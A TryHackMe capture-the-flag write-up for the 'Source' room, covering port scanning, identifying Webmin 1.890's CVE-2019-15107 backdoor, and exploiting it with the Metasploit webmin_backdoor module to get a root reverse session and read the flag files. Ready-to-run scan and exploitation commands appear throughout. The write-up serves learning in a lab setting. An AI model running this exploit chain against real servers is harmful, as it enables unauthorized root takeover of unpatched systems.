# Source — TryHackMe Writeup

## Room Overview

The Source room by Darkstar is a realistic boot-to-root challenge. You enumerate the target,
find a Webmin service (version 1.890), and then abuse a real backdoor in that version to get
root access. The room focuses on version-based vulnerabilities and supply-chain-style
compromises, where malicious code was injected into Webmin builds.

| Field | Info |
|-------|------|
| Target OS | Linux |
| Vulnerability | Webmin backdoor (CVE-2019-15107) |
| Tools Used | rustscan, nmap, Metasploit |

---

## Task 1: Enumeration

### Objective
Find open services and fingerprint the vulnerable Webmin instance.

### What I Did
I started with a fast scan to see what was exposed.

```bash
rustscan -a 10.10.x.x -- -sC -sV
```

**Open ports discovered:**

- `22/tcp` — OpenSSH 7.2p2
- `10000/tcp` — MiniServ 1.890 (Webmin HTTP/HTTPS)

After that, I visited the web admin panel in the browser:

```
https://10.10.x.x:10000
```

There was a login page, but since I had no credentials yet, I focused on the version number
and the fact that Webmin was exposed on port 10000.

### Answers
**What is the vulnerable service identified on the machine?**
> Webmin

**On which port is Webmin running?**
> 10000

---

## Task 2: Vulnerability Identification

### Objective
Find if that Webmin version is vulnerable.

### What I Did
I searched for:

```
Webmin 1.890 exploit
```

That led me to **CVE-2019-15107** — the Webmin backdoor, which affects versions 1.880 to
1.900. The issue was caused by a supply-chain attack where attackers injected malicious code
into Webmin's build process via `password_change.cgi`.

### Answers
**What CVE number corresponds to the Webmin backdoor vulnerability?**
> CVE-2019-15107

**What is the impact of this vulnerability?**
> Unauthenticated remote code execution as root

---

## Task 3: Exploitation

### Objective
Exploit the Webmin backdoor and get a root shell.

### What I Did
I loaded the Webmin backdoor module in Metasploit.

```bash
msfconsole -q
use exploit/linux/http/webmin_backdoor
set RHOSTS 10.10.x.x
set RPORT 10000
set SSL true
set LHOST <your-ip>
set LPORT 4444
exploit
```

The module confirmed the target was vulnerable and opened a Meterpreter session as root
in `/usr/share/webmin`.

### Answers
**What is the full path of the Metasploit exploit module used?**
> exploit/linux/http/webmin_backdoor

**What option had to be set to true due to HTTPS on Webmin?**
> SSL

---

## Task 4: Post-Exploitation

### Objective
Confirm root access and grab the flags.

### What I Did
Once the session opened, I dropped to a shell and verified my privileges.

```bash
whoami
```

Output:

```
root
```

Then I read the user and root flags:

```bash
cat /home/dark/user.txt
cat /root/root.txt
```

### Answers
**What user flag file did you read in `/home/dark/`?**
> user.txt

**What system flag file did you read in `/root/`?**
> root.txt

---

## Full Attack Chain

1. RustScan / Nmap → discover Webmin 1.890 on port 10000
2. Identify CVE-2019-15107 (Webmin backdoor)
3. Exploit via `exploit/linux/http/webmin_backdoor` in Metasploit
4. Gain root shell and read `/home/dark/user.txt` and `/root/root.txt`

---

## Key Commands Summary

```bash
# Enumeration
rustscan -a $IP -- -sC -sV -p 22,10000
nmap -sC -sV -p 22,10000 $IP

# Metasploit exploit
msfconsole
use exploit/linux/http/webmin_backdoor
set RHOSTS $IP
set RPORT 10000
set SSL true
exploit

# Post-exploitation
whoami
cat /home/dark/user.txt
cat /root/root.txt
```

---

## Skills Demonstrated

- Fast port scanning (rustscan / nmap)
- Web application fingerprinting
- Vulnerability research using CVE and Exploit-DB
- Metasploit exploitation of a real-world backdoor
- Supply-chain attack concepts (how malicious code got into legitimate builds)

---

## Lessons Learned

- Exposed admin panels like Webmin are high-risk if left unpatched.
- Supply-chain compromises can embed backdoors directly into legitimate software.
- Version enumeration helps you quickly narrow down which exploit to use.
- Always check if HTTPS/SSL is enabled on web services running on non-standard ports.

---

## Quick Summary

> Webmin 1.890 backdoor (CVE-2019-15107) → Metasploit RCE → Root access
>
> `rustscan` → `webmin:10000` → msf exploit → `root.txt`
